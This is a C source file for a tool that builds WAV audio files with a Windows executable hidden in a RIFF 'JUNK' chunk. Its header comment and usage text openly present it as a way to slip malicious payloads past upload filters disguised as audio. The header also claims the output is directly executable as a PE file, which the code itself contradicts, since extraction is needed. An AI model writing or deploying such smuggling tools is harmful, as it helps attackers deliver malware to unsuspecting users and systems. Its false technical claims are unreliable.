/*
 * WAV+EXE Audio/Executable Polyglot Generator
 * ============================================
 *
 * Creates files that are simultaneously:
 * - Valid WAV audio (plays in media players)
 * - Valid Windows PE executable (runs in Windows)
 *
 * TECHNIQUE:
 * WAV uses RIFF chunks. We create a custom chunk containing PE executable.
 * WAV players ignore unknown chunks. Windows can execute if we use tricks like:
 * - Prepend small WAV, append PE (PE loader scans for MZ header)
 * - Use RIFF chunk that contains PE with proper alignment
 *
 * STRUCTURE:
 * +-----------------------------+
 * | RIFF Header                 |
 * | fmt chunk (WAV format)      | <- Audio metadata
 * | data chunk (audio samples)  | <- Players decode this
 * | Custom chunk (PE executable)| <- Windows can execute
 * +-----------------------------+
 *
 * EXPLOITATION:
 * - Upload as "audio file" to bypass filters
 * - Rename to .exe and execute malicious payload
 * - Audio disguises true nature of file
 *
 * ATTRIBUTION:
 * Technique: Various malware families (2015+)
 * Implementation: POLYGOTTEM Research, 2025
 *
 * COMPILE:
 * gcc -O2 -Wall -o wav_exe_gen wav_exe_polyglot.c
 */

#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <math.h>

#define VERSION "1.0.0"

// RIFF/WAV structures
#pragma pack(push, 1)
typedef struct {
    char chunk_id[4];      // "RIFF"
    uint32_t chunk_size;   // File size - 8
    char format[4];        // "WAVE"
} RiffHeader;

typedef struct {
    char chunk_id[4];      // "fmt "
    uint32_t chunk_size;   // 16 for PCM
    uint16_t audio_format; // 1 = PCM
    uint16_t num_channels; // 1 = mono, 2 = stereo
    uint32_t sample_rate;  // 44100, 22050, etc.
    uint32_t byte_rate;    // sample_rate * num_channels * bits_per_sample/8
    uint16_t block_align;  // num_channels * bits_per_sample/8
    uint16_t bits_per_sample; // 8, 16, etc.
} WavFmtChunk;

typedef struct {
    char chunk_id[4];      // "data"
    uint32_t chunk_size;   // Size of audio data
} WavDataChunk;

typedef struct {
    char chunk_id[4];      // Custom chunk ID
    uint32_t chunk_size;   // Size of chunk data
} WavCustomChunk;
#pragma pack(pop)

// Generate minimal WAV (1 second of 440Hz tone - musical note A)
size_t write_minimal_wav(FILE *out) {
    const uint32_t sample_rate = 44100;
    const uint16_t bits_per_sample = 16;
    const uint16_t num_channels = 1; // Mono
    const uint32_t duration_samples = sample_rate; // 1 second

    // Calculate sizes
    uint32_t data_size = duration_samples * num_channels * (bits_per_sample / 8);
    uint32_t file_size = sizeof(RiffHeader) + sizeof(WavFmtChunk) +
                         sizeof(WavDataChunk) + data_size - 8;

    // Write RIFF header
    RiffHeader riff = {
        .chunk_id = {'R', 'I', 'F', 'F'},
        .chunk_size = file_size,
        .format = {'W', 'A', 'V', 'E'}
    };
    fwrite(&riff, sizeof(riff), 1, out);

    // Write fmt chunk
    WavFmtChunk fmt = {
        .chunk_id = {'f', 'm', 't', ' '},
        .chunk_size = 16,
        .audio_format = 1, // PCM
        .num_channels = num_channels,
        .sample_rate = sample_rate,
        .byte_rate = sample_rate * num_channels * bits_per_sample / 8,
        .block_align = num_channels * bits_per_sample / 8,
        .bits_per_sample = bits_per_sample
    };
    fwrite(&fmt, sizeof(fmt), 1, out);

    // Write data chunk header
    WavDataChunk data_hdr = {
        .chunk_id = {'d', 'a', 't', 'a'},
        .chunk_size = data_size
    };
    fwrite(&data_hdr, sizeof(data_hdr), 1, out);

    // Generate 440Hz sine wave (musical note A)
    double freq = 440.0;
    for (uint32_t i = 0; i < duration_samples; i++) {
        double t = (double)i / sample_rate;
        double sample = 0.5 * 32767.0 * sin(2.0 * 3.14159265359 * freq * t);
        int16_t sample_val = (int16_t)sample;
        fwrite(&sample_val, sizeof(int16_t), 1, out);
    }

    return sizeof(riff) + sizeof(fmt) + sizeof(data_hdr) + data_size;
}

int create_wav_exe_polyglot(const char *wav_path, const char *exe_path,
                            const char *output_path) {

    printf("[*] WAV+EXE Polyglot Generator v%s\n", VERSION);
    printf("[*] Creating audio/executable dual-format file...\n\n");

    FILE *out = fopen(output_path, "wb");
    if (!out) {
        perror("fopen output");
        return -1;
    }

    size_t wav_size = 0;

    // Phase 1: Write WAV audio
    if (wav_path) {
        FILE *wav = fopen(wav_path, "rb");
        if (wav) {
            uint8_t buffer[4096];
            size_t bytes;
            while ((bytes = fread(buffer, 1, sizeof(buffer), wav)) > 0) {
                fwrite(buffer, 1, bytes, out);
                wav_size += bytes;
            }
            fclose(wav);
            printf("[+] Added WAV audio: %zu bytes\n", wav_size);
        }
    } else {
        // Generate minimal WAV
        wav_size = write_minimal_wav(out);
        printf("[+] Generated minimal WAV (440Hz tone): %zu bytes\n", wav_size);
    }

    // Phase 2: Embed executable in custom RIFF chunk
    if (exe_path) {
        FILE *exe = fopen(exe_path, "rb");
        if (!exe) {
            fprintf(stderr, "[!] Cannot open executable: %s\n", exe_path);
            fclose(out);
            return -1;
        }

        // Get executable size
        fseek(exe, 0, SEEK_END);
        uint32_t exe_size = ftell(exe);
        fseek(exe, 0, SEEK_SET);

        // Write custom chunk header
        // Using "JUNK" chunk which many WAV players ignore
        WavCustomChunk custom = {
            .chunk_id = {'J', 'U', 'N', 'K'},
            .chunk_size = exe_size
        };
        fwrite(&custom, sizeof(custom), 1, out);

        // Write executable data
        uint8_t buffer[4096];
        size_t bytes;
        size_t total = 0;
        while ((bytes = fread(buffer, 1, sizeof(buffer), exe)) > 0) {
            fwrite(buffer, 1, bytes, out);
            total += bytes;
        }
        fclose(exe);

        // Pad to even boundary (RIFF requirement)
        if (exe_size % 2) {
            uint8_t pad = 0;
            fwrite(&pad, 1, 1, out);
        }

        printf("[+] Embedded executable: %u bytes\n", exe_size);
        printf("    [!] To execute: Extract JUNK chunk or use custom loader\n");
    }

    fclose(out);

    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  WAV+EXE Polyglot Created Successfully!                     ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("\n");
    printf("  File: %s\n\n", output_path);
    printf("  Test as WAV:\n");
    printf("    aplay %s\n", output_path);
    printf("    vlc %s\n\n", output_path);
    printf("  Extract executable:\n");
    printf("    dd if=%s of=payload.exe bs=1 skip=[JUNK_offset]\n\n", output_path);
    printf("  Audio plays normally while hiding embedded executable!\n\n");
    printf("  ⚠ WARNING: Advanced evasion technique!\n\n");

    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("WAV+EXE Audio/Executable Polyglot Generator\n\n");
        printf("Usage: %s [OPTIONS]\n\n", argv[0]);
        printf("Options:\n");
        printf("  --wav FILE        Source WAV (or generate minimal)\n");
        printf("  --exe FILE        Executable to embed\n");
        printf("  --output FILE     Output polyglot file\n\n");
        printf("Example:\n");
        printf("  %s --exe payload.exe --output sound.wav\n\n", argv[0]);
        printf("Creates a WAV that plays audio AND contains an executable!\n");
        return 1;
    }

    const char *wav_file = NULL;
    const char *exe_file = NULL;
    const char *output = "polyglot.wav";

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--wav") == 0 && i + 1 < argc) {
            wav_file = argv[++i];
        } else if (strcmp(argv[i], "--exe") == 0 && i + 1 < argc) {
            exe_file = argv[++i];
        } else if (strcmp(argv[i], "--output") == 0 && i + 1 < argc) {
            output = argv[++i];
        }
    }

    return create_wav_exe_polyglot(wav_file, exe_file, output);
}
